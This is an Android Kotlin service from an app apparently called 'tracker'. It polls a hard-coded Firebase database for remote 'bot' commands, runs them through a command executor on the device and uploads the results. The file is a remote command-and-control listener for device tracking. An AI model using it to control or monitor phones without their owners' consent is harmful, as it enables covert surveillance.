package com.abuzahra.tracker.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.tracker.CommandExecutor
import com.abuzahra.tracker.SharedPrefsManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * FirebaseCommandService - خدمة الاستماع لأوامر Firebase
 * تستمع لأوامر البوت من Firebase RTDB وتنفذها فوراً
 * 
 * === الإصلاح v4.0: منع تنفيذ الأمر أكثر من مرة (مستمر) ===
 * 1. تخزين معرّفات الأوامر المُعالجة في SharedPreferences (يصمد عبر إعادة التشغيل)
 * 2. حذف الأمر من Firebase BEFORE التنفيذ (atomic read-and-delete)
 * 3. تحديث حالة الأمر بشكل متزامن (ليس غير متزامن)
 * 4. تنظيف الأوامر القديمة (> 5 دقائق) بشكل دوري
 * 5. زيادة فترة الاستطلاع إلى 10 ثواني
 */
class FirebaseCommandService : Service() {

    companion object {
        private const val TAG = "FirebaseCmdService"
        private const val NOTIFICATION_ID = 3
        private const val CHANNEL_ID = "firebase_cmd_channel"
        private const val FIREBASE_RTDB_URL = "https://studio-7073076148-6afe0-default-rtdb.firebaseio.com"
        private const val POLL_INTERVAL = 10000L // 10 seconds (increased to prevent race condition)

        // Persistent dedup storage
        private const val PREFS_PROCESSED = "processed_commands_prefs"
        private const val KEY_PROCESSED_IDS = "processed_cmd_ids"
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "تم إنشاء خدمة استماع Firebase (v4.0 - persistent anti-repeat)")
        startForegroundNotification()
        startFirebasePolling()
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(CHANNEL_ID, "Firebase Commands", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Firebase Command Listener")
            .setContentText("Listening for commands...")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .build()
        startForeground(NOTIFICATION_ID, notification)
    }

    // ==================== Persistent Dedup Helpers ====================

    private fun getProcessedPrefs(context: Context): android.content.SharedPreferences {
        return context.getSharedPreferences(PREFS_PROCESSED, Context.MODE_PRIVATE)
    }

    private fun loadProcessedIds(context: Context): MutableSet<String> {
        val prefs = getProcessedPrefs(context)
        return prefs.getStringSet(KEY_PROCESSED_IDS, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
    }

    private fun saveProcessedId(context: Context, cmdId: String) {
        val prefs = getProcessedPrefs(context)
        val ids = loadProcessedIds(context)
        ids.add(cmdId)
        // Keep only last 50 entries to avoid unbounded growth
        while (ids.size > 50) ids.remove(ids.first())
        prefs.edit()
            .putStringSet(KEY_PROCESSED_IDS, ids)
            .putLong("ts_$cmdId", System.currentTimeMillis())
            .apply()
    }

    /** Check if a command was already processed (persistent check) */
    private fun isAlreadyProcessed(context: Context, cmdId: String): Boolean {
        return cmdId in loadProcessedIds(context)
    }

    /** Clean entries older than 5 minutes */
    private fun cleanOldProcessedIds(context: Context) {
        try {
            val prefs = getProcessedPrefs(context)
            val ids = loadProcessedIds(context)
            val now = System.currentTimeMillis()
            val fiveMinutes = 5 * 60 * 1000L
            val editor = prefs.edit()
            val toRemove = mutableListOf<String>()
            for (id in ids) {
                val timestamp = prefs.getLong("ts_$id", 0)
                if (timestamp > 0 && (now - timestamp) > fiveMinutes) {
                    toRemove.add(id)
                }
            }
            if (toRemove.isNotEmpty()) {
                ids.removeAll(toRemove)
                editor.putStringSet(KEY_PROCESSED_IDS, ids)
                for (id in toRemove) {
                    editor.remove("ts_$id")
                }
                editor.apply()
                Log.d(TAG, "تنظيف ${toRemove.size} معرّفات أوامر قديمة")
            }
            // Also cap at 50
            while (ids.size > 50) {
                val oldest = ids.first()
                ids.remove(oldest)
                editor.remove("ts_$oldest")
            }
            editor.putStringSet(KEY_PROCESSED_IDS, ids).apply()
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في تنظيف المعرّفات القديمة: ${e.message}")
        }
    }

    // ==================== Firebase Polling ====================

    private fun startFirebasePolling() {
        serviceScope.launch {
            Log.d(TAG, "بدء استطلاع Firebase للأوامر...")
            // تنظيف الأوامر القديمة عند البدء
            cleanAllStaleCommands()
            while (isActive) {
                try {
                    pollFirebaseCommands()
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في استطلاع Firebase: ${e.message}")
                }
                delay(POLL_INTERVAL)
                // تنظيف المعرّفات القديمة بشكل دوري
                cleanOldProcessedIds(this@FirebaseCommandService)
            }
        }
    }

    /** تنظيف جميع الأوامر المعلقة عند بدء التشغيل */
    private fun cleanAllStaleCommands() {
        try {
            val deviceId = SharedPrefsManager.getDeviceId(this@FirebaseCommandService) ?: return
            val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId.json")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            val responseCode = connection.responseCode
            if (responseCode == 200) {
                val response = connection.inputStream?.bufferedReader()?.use { it.readText() } ?: "{}"
                connection.disconnect()
                val commandsObj = JSONObject(response)
                if (commandsObj.length() > 0) {
                    Log.d(TAG, "تنظيف ${commandsObj.length()} أوامر قديمة عند البدء")
                    deleteAllCommands(deviceId)
                }
            } else {
                connection.disconnect()
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في تنظيف الأوامر القديمة: ${e.message}")
        }
    }

    /** حذف جميع أوامر جهاز من Firebase */
    private fun deleteAllCommands(deviceId: String) {
        try {
            val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId.json")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "DELETE"
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            connection.responseCode
            connection.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حذف الأوامر: ${e.message}")
        }
    }

    private suspend fun pollFirebaseCommands() {
        val deviceId = SharedPrefsManager.getDeviceId(this@FirebaseCommandService) ?: return
        
        try {
            // GET commands/{deviceId} from Firebase
            val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId.json")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.instanceFollowRedirects = true
            
            val responseCode = connection.responseCode
            if (responseCode != 200) {
                Log.w(TAG, "Firebase GET commands returned: $responseCode")
                connection.disconnect()
                return
            }
            
            val response = connection.inputStream?.bufferedReader()?.use { it.readText() } ?: "{}"
            connection.disconnect()
            
            val commandsObj = JSONObject(response)
            if (commandsObj.length() == 0) {
                return
            }
            
            Log.d(TAG, "Firebase: وجد ${commandsObj.length()} أوامر")
            
            val keys = commandsObj.keys()
            for (cmdId in keys) {
                try {
                    // === منع تنفيذ نفس الأمر مرتين (persistent check via SharedPreferences) ===
                    if (isAlreadyProcessed(this@FirebaseCommandService, cmdId)) {
                        Log.d(TAG, "Firebase: تم تخطي الأمر $cmdId (مُعالج مسبقاً)")
                        deleteCommandFromFirebaseSync(deviceId, cmdId)
                        continue
                    }

                    val cmdObj = commandsObj.getJSONObject(cmdId)
                    val status = cmdObj.optString("status", "pending")
                    
                    if (status != "pending") continue
                    
                    val command = cmdObj.getString("command")
                    val params = cmdObj.optJSONObject("params") ?: JSONObject()
                    
                    // === تسجيل الأمر فوراً في SharedPreferences (يصمد عبر إعادة التشغيل) ===
                    saveProcessedId(this@FirebaseCommandService, cmdId)
                    
                    Log.d(TAG, "Firebase: تنفيذ الأمر $command (id=$cmdId)")

                    // === ATOMIC: Delete from Firebase BEFORE execution ===
                    // This prevents the command from being picked up again if the app crashes during execution
                    deleteCommandFromFirebaseSync(deviceId, cmdId)
                    
                    // Execute the command
                    val result = CommandExecutor.execute(this@FirebaseCommandService, command, params)
                    Log.d(TAG, "نتيجة الأمر $command: ${result.take(200)}")
                    
                    // Write result to Firebase
                    writeResultToFirebaseSync(deviceId, cmdId, command, result)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في معالجة الأمر: ${e.message}")
                    // تسجيل حتى الأخطاء لمنع إعادة المحاولة (persistent)
                    saveProcessedId(this@FirebaseCommandService, cmdId)
                    // Write error result
                    writeResultToFirebaseSync(deviceId, cmdId, "error", """{"ok":false,"error":"${e.message}"}""")
                    // Ensure command is deleted
                    deleteCommandFromFirebaseSync(deviceId, cmdId)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في pollFirebaseCommands: ${e.message}")
        }
    }

    /** Write result to Firebase - SYNCHRONOUS to ensure result is written */
    private fun writeResultToFirebaseSync(deviceId: String, cmdId: String, command: String, result: String) {
        try {
            val resultObj = JSONObject()
            resultObj.put("command", command)
            resultObj.put("result", result)
            resultObj.put("status", "completed")
            resultObj.put("timestamp", System.currentTimeMillis())
            
            val url = URL("$FIREBASE_RTDB_URL/results/$deviceId/$cmdId.json")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "PUT"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.outputStream.write(resultObj.toString().toByteArray(Charsets.UTF_8))
            connection.outputStream.flush()
            
            val responseCode = connection.responseCode
            connection.disconnect()
            Log.d(TAG, "كتابة النتيجة في Firebase: $responseCode (cmd=$cmdId)")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في كتابة النتيجة: ${e.message}")
        }
    }

    /** Delete command from Firebase - SYNCHRONOUS */
    private fun deleteCommandFromFirebaseSync(deviceId: String, cmdId: String) {
        try {
            val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId/$cmdId.json")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "DELETE"
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            connection.responseCode
            connection.disconnect()
            Log.d(TAG, "تم حذف الأمر $cmdId من Firebase")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حذف الأمر من Firebase: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        Log.d(TAG, "تم تدمير خدمة Firebase")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
